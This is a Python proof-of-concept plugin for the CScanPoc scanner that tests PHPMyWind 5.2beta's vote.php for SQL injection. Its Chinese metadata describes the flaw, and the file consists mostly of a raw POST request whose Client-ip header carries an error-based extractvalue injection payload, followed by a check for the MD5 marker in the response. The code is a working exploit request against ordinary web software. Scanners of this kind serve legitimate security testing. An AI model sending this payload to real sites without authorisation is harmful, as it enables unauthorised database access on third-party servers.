# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'PHPMyWind_0011'  # 平台漏洞编号，留空
    name = 'PHPMyWind SQL注射'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-01-07'  # 漏洞公布时间
    desc = '''
        PHPMyWind 是一款基于PHP+MySQL开发，符合W3C标准的建站引擎。
        5.2beta 2014-12-28 参数没有处理，绕过过滤。
        /vote.php?id=1
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=081372'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'PHPMyWind'  # 漏洞应用名称
    product_version = '5.2beta'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'ae19ec6c-a941-4dd6-b7e2-0fda0d91387a'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-11'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            # Refer=http://www.wooyun.org/bugs/wooyun-2010-081372
            payload = "/vote.php?id=1"
            target = self.target + payload
            raw = '''
POST xx HTTP/1.1
Host: xx
Connection: keep-alive
Content-Length: 35
Content-Type: application/x-www-form-urlencoded
Client-ip: 1.2.3.4\t' and  extractvalue(1,concat(0x5c,md5(1))) and '1'='1

options%5B%5D=1&voteid=1&action=add
            '''
            code, head, body, errcode, final_url = hh.http(target, raw=raw)
            if code == 200 and 'c4ca4238a0b923820dcc509a6f75849' in body:
                # security_hole(target))
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
